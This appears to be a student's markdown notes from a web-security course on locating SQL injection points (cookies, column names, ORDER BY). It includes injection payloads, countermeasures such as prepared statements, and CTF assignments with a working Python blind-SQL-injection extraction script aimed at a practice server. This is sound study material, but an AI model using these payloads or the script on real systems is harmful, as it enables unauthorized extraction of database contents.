# Find SQL Injection Point

## Part 1 - Review
1. SQL Injection = Extract Data
- Union = Disply SQL Result
- Error Based = Disply SQL Error
- Blind = SQL Working
2. Find SQL Injection Point
- The SQL Place to request DB
- When where user_id like, test = nor%' and '1%'='1

## Part 2. - Find SQL Injection Point
* [SQL Point](https://velvetviolet1024.tistory.com/81)
1. HTTP request header (cookie)
- It works SQL select function in cookie information to bring DB data
2. Column name SQL Injection (https://www.sqlinjection.net/column-names/)
```javascript
select () from () where (option_val) like '%(board_result)%'
```
3. Sort (order by SQL Injection)
```javascript
where username like '&sfUser&' order by (case)
case when (condition) then (true) else (false) end
case when (1=1) then username else title end
case when (1=1) then 1 else (select 1 union select 2) end
select 1 union select 2 where 1=1
```
4. causing error
```javascript
sfUser' and (select 1 union select 2 where (1=2) and '1'='1
```

## Part 3. - SQL Injection countermeasure
1. Prepared Statement
- Prepared compiling
2. Vulnerabilities
- Wrong situation
- Not working of prepared statement (order by, table name, column name)
3. White List Filtering
- White list = be able to use some words
- Black list = cannot use some words

## Part 4. - Assignment
1. Review
2. SQL Injection attack types (https://www.acunetix.com/websitesecurity/sql-injection2/)
3. CTF
* SQL Injection Point 1
  - On the mypage, check the SQL injection point.
```javascript
Cookie: user=muhush' and '1'='1; session=fa7175eb-376b-4af5-9e86-81393acf11a9.aU7QuoD1Nzvk5f-sAlyIfxpL2j0; PHPSESSID=8okntclrajuqjvnmgvuca9cdki
<div class = "hori">
  <i class="fas fa-birthday-cake fa-2x"></i>
  <input name = "info" type = "text" placeholder="Nothing Here..."/>
</div>
```
  - Check the false SQL injection condition.
```javascript
Cookie: user=muhush' and '1'='2; session=fa7175eb-376b-4af5-9e86-81393acf11a9.aU7QuoD1Nzvk5f-sAlyIfxpL2j0; PHPSESSID=8okntclrajuqjvnmgvuca9cdki
<div class = "hori">
  <i class="fas fa-birthday-cake fa-2x"></i>
  <input name = "info" type = "text" placeholder=""/>
</div>
```  
  - Python Format
```python
import requests
url = "http://ctf.segfaulthub.com:7777/sqli_6/mypage.php"
success_message = 'Nothing Here'
def send_request(sql_query):
    cookie = {'user':sql_query,
              'PHPSESSID':'8okntclrajuqjvnmgvuca9cdki'
              }
    response = requests.post(url, cookies=cookie)
    return success_message in response.text

sql_query = input("Put your SQL Injection: ")
def Blind_SQLi(sql):
    extract_info = ''
    for i in range(1,101): #Maximum letter 100
        for j in range(32,127): #ascii range
            payload = f"muhush' and (ascii(substr(({sql}),{i},1))={j}) and '1'='1"
            if send_request(payload):
                extract_info += chr(j)
                break
        else:
            break # No more letter
    return extract_info
extracted_data = Blind_SQLi(sql_query)
print(f"Extracted Data: {extracted_data}")
```
* SQL Injection Point 2
  - On the board, check the SQL injection point
```javascript
option_val=username&board_result=x&board_search=%F0%9F%94%8D&date_from=&date_to=
```
  - True SQL Injection = Display the result
```javascript
option_val='1'='1' and username&board_result=x&board_search=%F0%9F%94%8D&date_from=&date_to=
```
  - False SQL Injection = Non-display the result
```javascript
option_val='1'='2' and username&board_result=x&board_search=%F0%9F%94%8D&date_from=&date_to=
```

4. Web Development (Board - search function with secure code)
